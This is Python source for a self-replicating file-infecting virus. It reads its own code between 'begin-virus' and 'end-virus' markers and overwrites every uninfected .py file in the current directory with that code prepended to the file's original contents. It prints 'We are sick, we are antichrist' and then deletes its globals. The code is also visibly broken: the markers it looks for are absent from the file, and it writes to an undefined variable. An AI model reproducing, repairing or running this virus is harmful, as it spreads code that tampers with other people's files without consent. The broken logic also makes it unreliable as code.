from asyncore import write
import glob
from ntpath import join

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()
        
    return data

def get_virus_code():
    
    virus_code_on = False
    virus_code = []
    
    code = get_content_of_file(__file__)
    
    for line in code:
        if "# begin-virus\n" in line:
            virus_code_on = True
            
        if virus_code_on:
            virus_code.append(line)
            
        if "# end-virus\n" in line:
            virus_code_on = False
            break
        
    return virus_code

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            infected_file.write("".join(virus_code))
            infected_files.writelines(data)
            
def summon_chaos():
    print("We are sick, we are antichrist")

def find_files_to_infect(directory = "."):
    return [file for file in glob.glob("*.py")]

try:
    virus_code = get_virus_code()
    
    for file in find_files_to_infect():
        infect(file, virus_code)
        
        
        summon_chaos()
        
finally:
    for i in list(globals().keys()):
        if (i[0] != '_'):
            exec('del {}'.format(i))
            
    del i